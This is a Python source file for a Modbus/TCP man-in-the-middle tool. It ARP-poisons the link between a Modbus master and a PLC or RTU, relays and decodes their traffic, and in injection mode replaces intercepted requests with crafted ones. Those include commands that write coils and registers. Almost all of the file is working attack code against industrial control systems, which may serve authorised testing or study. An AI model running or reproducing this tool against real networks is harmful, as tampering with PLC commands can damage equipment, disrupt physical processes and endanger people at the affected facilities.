#!/usr/bin/env python3
"""
modbus_mitm_capture.py

Modbus/TCP MITM capture tool using ARP spoofing to reposition traffic
between a Modbus master and slave onto this host, then decoding the
Modbus/TCP traffic that flows through.

Requires: scapy and root privileges
  pip install scapy --break-system-packages

Usage:
  sudo python3 mopi.py -i eth0 -v 192.168.1.50 -t 192.168.1.10

Features to add:
    - more output/logging to help debug + improve user experience
    - rename 'victim' and 'target' to 'client' and 'server'
    - complete other TODOs
    - properly test interactive mode
    - add ability to allow user to input config file which tells script how to modify every function type
  """

import argparse
import sys
import threading
import time
from datetime import datetime, timezone


try:
    from scapy.all import (
        sniff, sr1, send, ARP, Ether, TCP, IP, Raw, conf, get_if_hwaddr,sendp,srp1,sr
    )
    from scapy.contrib.modbus import (
    ModbusADURequest,
    ModbusPDU01ReadCoilsRequest,
    ModbusPDU02ReadDiscreteInputsRequest,
    ModbusPDU03ReadHoldingRegistersRequest,
    ModbusPDU04ReadInputRegistersRequest,
    ModbusPDU05WriteSingleCoilRequest,
    ModbusPDU06WriteSingleRegisterRequest,
    ModbusPDU0FWriteMultipleCoilsRequest,
    ModbusPDU10WriteMultipleRegistersRequest,
    ModbusADUResponse
)
except ImportError:
    print("scapy is required: pip install scapy --break-system-packages", file=sys.stderr)
    sys.exit(1)

VERSION="0.2"

MODBUS_FUNCTION_CODES = {
    0x01: "Read Coils",                 #1
    0x02: "Read Discrete Inputs",       #2
    0x03: "Read Holding Registers",     #3
    0x04: "Read Input Registers",       #4
    0x05: "Write Single Coil",          #5
    0x06: "Write Single Register",      #6
    0x0F: "Write Multiple Coils",       #10
    0x10: "Write Multiple Registers",   #16
}


def log_line(msg, log_file=None):
    line = f"[{datetime.now(timezone.utc).isoformat(timespec='seconds')}] {msg}"
    print(line)
    if log_file:
        log_file.write(line + "\n")
        log_file.flush()

def get_mac(ip, iface, timeout=3):
    ans = sr1(ARP(op=1, pdst=ip), timeout=timeout,  verbose=0)
    return ans[ARP].hwsrc if ans else None


def arp_spoof_loop(iface, victim_ip, victim_mac, target_ip, target_mac, own_mac, stop_event, interval=2):
    while not stop_event.is_set():
        # Tell victim that we are the target
        pkt1 = Ether(dst=victim_mac, src=own_mac) / ARP(
            op=2, pdst=victim_ip, hwdst=victim_mac, psrc=target_ip, hwsrc=own_mac
        )
        # Tell target that we are the victim
        pkt2 = Ether(dst=target_mac, src=own_mac) / ARP(
            op=2, pdst=target_ip, hwdst=target_mac, psrc=victim_ip, hwsrc=own_mac
        )
        sendp(pkt1, iface=iface, verbose=0)
        sendp(pkt2, iface=iface, verbose=0)
        stop_event.wait(interval)


def restore_arp(iface, victim_ip, victim_mac, target_ip, target_mac):
    # Send correct mappings a few times to overwrite the poisoned entries
    for _ in range(5):
        pkt1 = Ether(dst=victim_mac, src=target_mac) / ARP(
            op=2, pdst=victim_ip, hwdst=victim_mac, psrc=target_ip, hwsrc=target_mac
        )
        pkt2 = Ether(dst=target_mac, src=victim_mac) / ARP(
            op=2, pdst=target_ip, hwdst=target_mac, psrc=victim_ip, hwsrc=victim_mac
        )
        sendp(pkt1, iface=iface, verbose=0)
        sendp(pkt2, iface=iface, verbose=0)
        time.sleep(0.3)

seen_seqs = {}  # key: (src, sport, dst, dport) -> set of seq numbers seen

def stream_key(pkt):
    ip = pkt[IP]
    tcp = pkt[TCP]
    return (ip.src, tcp.sport, ip.dst, tcp.dport)

def is_retransmission(pkt):
    if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
        return

    key = stream_key(pkt)
    seq = pkt[TCP].seq
    payload_len = len(pkt[TCP].payload)

    # Only meaningful for segments carrying data (or SYN, which consumes a seq)
    if payload_len == 0 and "S" not in pkt[TCP].flags:
        return

    if key not in seen_seqs:
        seen_seqs[key] = set()

    if seq in seen_seqs[key]:
        print(f"Retransmission detected: {key} seq={seq}")
        return True
    else:
        seen_seqs[key].add(seq)
        print(f"Not a retransmission: {key} seq={seq}")
        return False

def print_modbus_payload(mb):
    func_code = mb.funcCode
    func_name = MODBUS_FUNCTION_CODES.get(func_code, "Unknown/Reserved")
    print(f"Function:\t\t{func_name} ({func_code})")

    # The actual PDU is whatever Scapy parsed as the payload of the ADU
    pdu = mb.payload

    # Map of field name -> friendly label, checked in order, only printed if present
    field_labels = [
        ("startAddr", "Start Address"),
        ("quantity", "Quantity"),
        ("outputAddr", "Coil Address"),
        ("outputValue", "Coil Value"),
        ("registerAddr", "Register Address"),
        ("registerValue", "Register Value"),
        ("quantityOutput", "Quantity (Coils)"),
        ("quantityRegisters", "Quantity (Registers)"),
        ("outputsValue", "Values"),
        ("byteCount", "Byte Count"),
        ("registerVal", "Register Values"),
        ("coilStatus", "Coil Status"),
    ]

    for field_name, label in field_labels:
        if hasattr(pdu, field_name):
            value = getattr(pdu, field_name)
            print(f"{label}:\t\t{value}")

def interactive_packet_craft():
    p=""
    print("1) Read Coils")
    print("2) Read Discrete Inputs")
    print("3) Read Holding Registers")
    print("4) Read Input Registers")
    print("5) Write Single Coil")
    print("6) Write Single Register")
    print("10) Write Multiple Coils")
    print("16) Write Multiple Register")

    func_choice = int(input("Select your function: "))
    print(func_choice)
    print("Selected: ",MODBUS_FUNCTION_CODES.get(func_choice))

    return(build_pdu(func_choice))


def build_pdu(func_code: int):
    if func_code in (0x01, 0x02, 0x03, 0x04):
        # All read requests share the same two fields
        start_addr = int(input("Start address: "), 0)
        quantity = int(input("Quantity: "))

        if func_code == 0x01:
            return ModbusPDU01ReadCoilsRequest(startAddr=start_addr, quantity=quantity)
        elif func_code == 0x02:
            return ModbusPDU02ReadDiscreteInputsRequest(startAddr=start_addr, quantity=quantity)
        elif func_code == 0x03:
            return ModbusPDU03ReadHoldingRegistersRequest(startAddr=start_addr, quantity=quantity)
        elif func_code == 0x04:
            return ModbusPDU04ReadInputRegistersRequest(startAddr=start_addr, quantity=quantity)

    elif func_code == 0x05:
        output_addr = int(input("Coil address: "), 0)
        state = input("State (on/off): ").strip().lower()
        output_value = 0xFF00 if state == "on" else 0x0000
        return ModbusPDU05WriteSingleCoilRequest(outputAddr=output_addr, outputValue=output_value)

    elif func_code == 0x06:
        reg_addr = int(input("Register address: "), 0)
        reg_value = int(input("Value to write: "), 0)
        return ModbusPDU06WriteSingleRegisterRequest(registerAddr=reg_addr, registerValue=reg_value)

    elif func_code == 0x0F:
        start_addr = int(input("Start address: "), 0)
        values_str = input("Coil values, comma separated (e.g. 1,0,1,1): ")
        values = [int(v.strip()) for v in values_str.split(",")]
        return ModbusPDU0FWriteMultipleCoilsRequest(
            startAddr=start_addr, quantityOutput=len(values), outputsValue=values
        )

    elif func_code == 0x10:
        start_addr = int(input("Start address: "), 0)
        values_str = input("Register values, comma separated (e.g. 100,200,300): ")
        values = [int(v.strip(), 0) for v in values_str.split(",")]
        return ModbusPDU10WriteMultipleRegistersRequest(
            startAddr=start_addr, quantityRegisters=len(values), outputsValue=values
        )

    raise ValueError(f"No PDU builder implemented for function code {func_code}")


def handle_packet(pkt, port, log_file,mappings,own_mac,crafted_pkt):
    is_custom=False
    if crafted_pkt!="":
        is_custom=True
    src = own_mac
    dst = pkt[IP].dst 

    # print("Source: "+src)
    # print("Dest: "+str(mappings[dst]))

    pkt[Ether].src=src
    pkt[Ether].dst=mappings[dst]


    if pkt.haslayer(ModbusADURequest):
        if is_retransmission(pkt):
            return
    else:
        sendp(pkt,loop=0,inter=0.2,verbose=0)
        return

    tcp = pkt[TCP]
   
    if tcp.sport != port and tcp.dport != port:
        return
    direction = "req " if tcp.dport == port else "resp"
    src = f"{pkt[IP].src}:{tcp.sport}"
    dst = f"{pkt[IP].dst}:{tcp.dport}"
    log_line(f"{direction} {src:>21} -> {dst:<21}", log_file)

    if is_custom:
        print("Crafting custom packet")
        trans_id = pkt[ModbusADURequest].transId
        unit_id = pkt[ModbusADURequest].unitId

        stripped = pkt.copy()
        stripped[TCP].remove_payload()
        modbus_payload = ModbusADURequest(transId=trans_id, unitId=unit_id) / crafted_pkt

        pkt = stripped / modbus_payload
    else: # just sniffing traffic
        print("\nRequest Recieved:")
        print_modbus_payload(pkt[ModbusADURequest])    
        print("-"*16)
    del pkt[TCP].chksum
    del pkt[IP].chksum

    # print(npkt.show(dump=True))
    # sendp(npkt,loop=0,inter=0.2,verbose=0) #try making this send and recieve to analysis the response
    response = srp1(pkt, timeout=3, verbose=0)
    if response:
        print("\nResponse received:")
        # response.show()
        if response.haslayer(ModbusADUResponse):
            print_modbus_payload(response[ModbusADUResponse])
            print("-"*16)
        else:
            print("Missing ModbusADUResponse layer...")
    else:
        print("No response — device may be down, dropping packets, or filtering the request")

def banner():
    print(f'''                                                                                                 
██▄  ▄██  ▄▄▄  ▄▄▄▄  ▄▄▄▄  ▄▄ ▄▄  ▄▄▄▄   █████▄  ▄▄▄   ▄▄▄▄ ▄▄ ▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄   ██ ▄▄  ▄▄   ▄▄ ▄▄▄▄▄  ▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄  ▄▄▄▄  
██ ▀▀ ██ ██▀██ ██▀██ ██▄██ ██ ██ ███▄▄   ██▄▄█▀ ██▀██ ██▀▀▀ ██▄█▀ ██▄▄    ██     ██ ███▄██   ██ ██▄▄  ██▀▀▀   ██  ██▀██ ██▄█▄ 
██    ██ ▀███▀ ████▀ ██▄█▀ ▀███▀ ▄▄██▀   ██     ██▀██ ▀████ ██ ██ ██▄▄▄   ██     ██ ██ ▀██ ▄▄█▀ ██▄▄▄ ▀████   ██  ▀███▀ ██ ██ 

by cdino, v{VERSION}                                                                                                                         
''')

def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("-i", "--interface", required=True, help="Interface to use")
    ap.add_argument("-v","--victim", required=True, help="IP of the Modbus master (client)")
    ap.add_argument("-t","--target", required=True, help="IP of the Modbus slave (PLC/RTU)")
    ap.add_argument("-p","--port", type=int, default=502, help="Modbus/TCP port (default 502)")
    ap.add_argument("--log", help="Optional path to append decoded output to")
    ap.add_argument("--injection", type=bool, help="Craft your own Modbus request")
    ap.add_argument("--arp-interval", type=float, default=2.0, help="Seconds between spoofed ARP bursts")
    args = ap.parse_args()

    banner()
    print("This tool actively repositions traffic via ARP spoofing.")
    time.sleep(1)
    print(f"Target scope: victim={args.victim}  target={args.target}  iface={args.interface}")

    log_file = open(args.log, "a") if args.log else None
    stop_event = threading.Event()

    crafted_pkt=""
    if args.injection:
        crafted_pkt = interactive_packet_craft()

    try:
        conf.iface = args.interface
    except Exception as e:
        log_line("[-] Error: "+str(e),log_file)
        exit(1)

    own_mac = get_if_hwaddr(args.interface) 
    victim_mac = get_mac(args.victim, args.interface)
    target_mac = get_mac(args.target, args.interface)

    if not victim_mac or not target_mac:
        print("Could not resolve MAC address for victim or target — aborting.", file=sys.stderr)
        sys.exit(1)

    log_line(f"Resolved victim {args.victim} -> {victim_mac}", log_file)
    log_line(f"Resolved target {args.target} -> {target_mac}", log_file)

    spoof_thread = threading.Thread(
        target=arp_spoof_loop,
        args=(args.interface, args.victim, victim_mac, args.target, target_mac, own_mac, stop_event, args.arp_interval),
        daemon=True,
    )
    spoof_thread.start()
    log_line("ARP spoofing started — traffic between victim and target now routes through this host.", log_file)

    bpf_filter = f"tcp port {args.port} and (host {args.victim} or host {args.target}) and not ether src {own_mac}" 


    mappings = {args.victim:victim_mac,args.target:target_mac}

    try:
        sniff(iface=args.interface, filter=bpf_filter,
              prn=lambda p: handle_packet(p, args.port, log_file,mappings,own_mac,crafted_pkt), store=False)
    except KeyboardInterrupt:
        pass
    finally:
        log_line("Stopping — restoring ARP tables and disabling forwarding.", log_file)
        stop_event.set()
        spoof_thread.join(timeout=2)
        restore_arp(args.interface, args.victim, victim_mac, args.target, target_mac)
        # set_ip_forwarding(False)
        if log_file:
            log_file.close()


if __name__ == "__main__":
    main()